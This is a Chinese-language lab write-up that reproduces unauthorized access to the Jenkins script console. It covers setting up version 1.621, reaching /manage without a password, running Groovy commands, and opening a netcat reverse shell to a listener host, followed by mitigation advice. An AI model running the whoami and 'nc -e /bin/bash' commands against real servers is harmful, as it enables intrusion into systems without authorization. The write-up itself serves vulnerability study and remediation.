---
title: Jenkins未授权访问漏洞
categories:
  - 漏洞复现
abbrlink: 15292
date: 2020-12-01 16:30:12
---

### 前言
　　默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。
<!-- more -->

### 环境搭建

```bash
wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载
官网地址：http://mirrors.jenkins.io/ 
dpkg -i jenkins_1.621_all.deb # 安装
sudo apt-get -f --fix-missing install # 如果有报依赖项的错误时执行
```

<img src="https://s3.ax1x.com/2020/12/01/DfHnoQ.png">

```bash
service jenkins start # 启动jenkins服务
```
访问8080端口后出现下图后环境搭建成功
<img src="https://s3.ax1x.com/2020/12/01/DfbFk4.png">

### 未授权访问
　　访问http://192.168.127.132:8080/manage 无需密码可直接访问
　　<img src="https://s3.ax1x.com/2020/12/01/DfqgGd.png">
### 漏洞利用
　　来到脚本命令行,可执行系统命令
　　输入`println "whoami".execute().text`，查看当前用户权限
<img src="https://s3.ax1x.com/2020/12/01/DfOecn.png">
　　反弹shell
　　开启333端口侦听
　　<img src="https://s3.ax1x.com/2020/12/01/DfOLD0.png">
　　脚本命令行，运行`println "nc -vn 10.16.122.123 333 -e /bin/bash".execute().text`,可成功返回shell
　　<img src="https://s3.ax1x.com/2020/12/01/DfXciF.png">
　　这里我有一个地方复现失败，在可选插件里面，是可以安装一个Terminal Plugin插件，它是一个终端插件，然而我并没有找到。
　　更多利用方法参考链接:https://www.secpulse.com/archives/2166.html
### 解决方案
　　1、升级版本
　　2、添加认证
　　3、禁止把Jenkins直接暴露在公网

